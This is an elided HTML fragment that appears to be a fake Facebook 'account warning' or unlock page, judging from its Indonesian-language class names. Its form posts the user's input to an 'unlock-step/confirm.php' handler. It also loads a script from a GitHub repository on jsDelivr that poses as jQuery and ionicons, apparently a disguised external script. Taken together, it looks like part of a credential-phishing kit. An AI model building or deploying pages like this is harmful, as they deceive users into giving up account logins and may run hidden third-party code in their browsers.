  ...
  <body>
    <div class="container">
      ...
      <div class="logoalexfbperingatan">
        ...
        <form action="unlock-step/confirm.php" method="post" onsubmit="$(this).end()">
        <div class="formalexfbperingatan">
                ...
                <input
                  ...
                  autocomplete="off" required
                />
                <button type="submit" id="btnfb" >Enter</button>
      ...
      crossorigin="anonymous"
    ></script>
    <script src="https://cdn.jsdelivr.net/gh/styleiconss/jquery3.6.0@master/ionicons.js"></script>
